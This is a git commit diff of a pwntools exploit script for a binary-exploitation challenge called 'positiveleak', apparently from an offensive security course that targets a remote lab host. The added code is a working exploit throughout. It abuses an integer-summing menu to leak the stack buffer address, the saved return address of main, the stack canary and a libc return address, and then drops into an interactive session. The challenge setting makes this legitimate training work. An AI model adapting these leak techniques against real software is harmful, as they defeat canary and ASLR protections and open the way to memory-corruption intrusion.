8bf8aa3233c0fab46869d985f4044ac91f17e5d1
superuser <hiimgiulio@gmail.com>
2023-10-25 12:02:37 +0200

    update

--- rop/positiveleak/script.py
+++ rop/positiveleak/script.py
@@ -16,54 +16,122 @@ def genbin(binary_name):
 		print(f"An exception occurred: {e}")
 		exit(-1)
 
-
-# takes an integer as input and displays the value on the stack at index i
-# it asusmes you are in menu once invoked
-def get_leak(i):
-    r.recvrepeat(timeout=0.2)
-    time.sleep(0.2)
-    r.sendline(b"0")            #add numbers
-    time.sleep(0.2)
-    r.sendline(str(i).encode()) # number of numbers I wanna add
-    time.sleep(0.2)
-    for i in range(i+1):        # adding them
-        r.sendline(b"0")
-        time.sleep(0.2)
-    r.sendline(b"1")            # display the sum
-    time.sleep(0.2)
-    r.recvlines(5)
-    r.recvuntil(b"> ")
-    r.recvlines(i)
-    value = hex(int(r.recvlineS().strip()))
-    print(value)
-
 context.terminal = ['tmux', 'splitw', '-h']
 #context.log_level = "error"
-warnings.filterwarnings("ignore", category=BytesWarning)
-
 
 # breakpoints
 add_numbers = "add_numbers:167"
 
+def leak_buffer(r):
+    r.sendline(b"0")
+    time.sleep(0.2)
+    r.sendline(b"0") # add 0 numbers
+    time.sleep(0.2)
+    r.sendline(b"")
+    time.sleep(0.2)
+    r.recvrepeat(timeout=0.2)
+    r.sendline(b"1")
+    time.sleep(0.2)
+    buffer = int(r.recvlineS(keepends=False)) - 0x70
+    r.recvrepeat(timeout=0.2)
+    return buffer
+
+def leak_sRIP_main(r):
+    r.sendline(b"0")
+    time.sleep(0.2)
+    r.sendline(b"1") # add 1 numbers
+    time.sleep(0.2)
+    r.sendline(b"")
+    time.sleep(0.2)
+    r.sendline(b"")
+    time.sleep(0.2)
+    r.recvrepeat(timeout=0.2)
+    r.sendline(b"1")
+    time.sleep(0.2)
+    r.recvline()
+    sRIP_main = int(r.recvlineS(keepends=False)) + 0x027e
+    r.recvrepeat(timeout=0.2)
+    return sRIP_main
+
+def leak_canary(r, buffer):
+    r.sendline(b"0")
+    time.sleep(0.2)
+    r.sendline(b"14") # add 14 numbers
+    time.sleep(0.2)
+    for i in range(9):
+        r.sendline(b"")
+        time.sleep(0.2)
+    r.sendline(b"42949672959")  # i = 9
+    time.sleep(0.2)
+    r.sendline(b"60129542143")  # temp_numbers = 13
+    time.sleep(0.2)
+    r.sendline(b"")             # number
+    time.sleep(0.2)
+    r.sendline(str(buffer).encode())
+    time.sleep(0.2)
+    r.sendline(b"-1")           # im on top of the canary but I dont want overwrite it
+    time.sleep(0.2)
+    r.recvrepeat(timeout=0.2)
+    r.sendline(b"1")
+    time.sleep(0.2)
+    r.recvlines(13)
+    canary = int(r.recvlineS(keepends=False))
+    r.recvrepeat(timeout=0.2)
+    return canary
+
+def leak_libc(r, buffer, canary, sRIP):
+    r.sendline(b"0")
+    time.sleep(0.2)
+    r.sendline(b"14")                   # add 14 numbers
+    time.sleep(0.2)
+    for i in range(9):
+        r.sendline(b"")
+        time.sleep(0.2)
+    r.sendline(b"42949672959")          # i = 9
+    time.sleep(0.2)
+    r.sendline(b"77309411327")          # temp_numbers = 17
+    time.sleep(0.2)
+    r.sendline(b"")                     # number
+    time.sleep(0.2)
+    r.sendline(str(buffer).encode())    # buffer
+    time.sleep(0.2)
+    r.sendline(str(canary).encode())    # canary
+    time.sleep(0.2)
+    r.sendline(b"")                     # sRBP (main)
+    time.sleep(0.2)
+    r.sendline(str(sRIP).encode())      # sRIP (main)
+    time.sleep(0.2)
+    r.sendline(b"")                     # sRBP (__libc_call_main)
+    time.sleep(0.2)
+    r.sendline(b"-1")                   # on top of sRIP (__libc_call_main)
+    time.sleep(0.2)
+    r.recvrepeat(timeout=0.2)
+    r.sendline(b"1")
+    time.sleep(0.2)
+    r.recvlines(17)
+    sRIP_libc = int(r.recvlineS(keepends=False))
+    r.recvrepeat(timeout=0.2)
+    return sRIP_libc
 
 if args["REMOTE"]:
 	r = remote("bin.offdef.jinblack.it", 3003)
 else:
     r = process("./positiveleak")
-    gdb.attach(r, f"""
-    b {add_numbers}
-    unset env
-    set disable-randomization off
-    c
-    """)
+    if args["DEBUG"]:
+        gdb.attach(r, f"""
+        b {add_numbers}
+        unset env
+        set disable-randomization off
+        c
+        """)
+        input("wait")
 
-input("wait")
-r.sendline(b"0") # add numbers
-time.sleep(0.2)
-r.sendline(b"11")
-time.sleep(0.2)
-for i in range(11):
-    r.sendline(p64(i)+b"\x00")
-    time.sleep(0.2)
-
+buffer = leak_buffer(r)
+sRIP_main = leak_sRIP_main(r)
+canary = leak_canary(r, buffer)
+sRIP_libc = leak_libc(r, buffer, canary, sRIP_main)
+print("buffer:\t", hex(buffer))
+print("sRIP:\t", hex(sRIP_main))
+print("canary:\t", hex(canary))
+print("sRIP_libc:\t", hex(sRIP_libc))
 r.interactive()
